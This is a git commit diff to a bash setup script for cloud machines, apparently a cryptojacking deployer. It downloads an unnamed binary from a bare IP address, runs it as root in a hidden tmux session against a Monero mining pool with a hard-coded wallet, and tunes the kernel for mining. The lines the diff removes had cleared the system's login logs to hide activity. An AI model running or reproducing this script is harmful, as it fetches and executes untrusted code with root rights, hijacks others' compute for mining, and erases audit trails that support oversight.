6b23ac906c8ab0328cf17464f6833bc2318ee82b
deepmonero <70528104+deepmonero@users.noreply.github.com>
2020-09-03 05:03:57 +0800

    Update user.sh

--- azure_script/user.sh
+++ azure_script/user.sh
@@ -1,19 +1,16 @@
 #!/usr/bin/env bash
-
-sudo apt-get update
-sudo apt-get -y upgrade
+sudo apt-get update && apt-get upgrade -y
 sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux msr-tools
+sudo sysctl -w vm.nr_hugepages=1500
+sudo bash -c "echo vm.nr_hugepages=1500 >> /etc/sysctl.conf"
 sudo modprobe msr
 sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
 sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
-sudo chmod +x *.sh
+sudo chmod +x enable_1gb_pages.sh
+sudo chmod +x randomx_boost.sh
 sudo sh enable_1gb_pages.sh
 sudo sh randomx_boost.sh
-rm -r enable_1gb_pages.sh
-rm -r randomx_boost.sh
 sudo wget http://51.38.98.168/papa/zzz
 sudo chmod +x zzz
 sudo tmux new-session -d -s a 'sudo ./zzz -o pool.supportxmr.com:3333 -u 4BGmSpeCKjogeDoSBLsx371MAXjiK676FcqfJ3hruYbFZnizUecid4v6rRW5eimdHeMQL7kKtc8HEUN94sTXYutk6gFw1gB -p graphcheck --cpu-priority 1 --max-cpu-usage 50 --donate-level 0 --nicehash --randomx-1gb-pages '
-sudo echo >/var/log/wtmp
-sudo echo >/var/log/btmp
-sudo echo >/var/log/lastlog
+
